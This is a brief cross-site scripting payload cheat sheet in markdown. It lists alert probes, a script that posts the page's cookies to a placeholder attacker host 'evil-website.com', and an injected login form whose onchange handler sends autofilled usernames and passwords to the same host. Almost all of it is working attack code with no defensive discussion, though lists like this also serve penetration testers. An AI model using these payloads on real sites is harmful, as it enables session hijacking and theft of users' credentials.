# Cross-Site Scripting

## General

```
<script>alert(document.cookie)</script>
```

```
<img src=x onerror=alert(document.cookie)>
```

## Steal Cookie

```
<script>
fetch("https://evil-website.com", {
  method: "POST",
  mode: "no-cors",
  body: JSON.stringify({ cookie: document.cookie }),
});
</script>
```

## Steal Password

**Only for users who have enabled autofill passwords**

```
<input name="username" id="username" />
<input
    name="password"
    id="password"
    type="password"
    onchange="if(this.value.length); fetch('https://evil-website.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"
/>
```

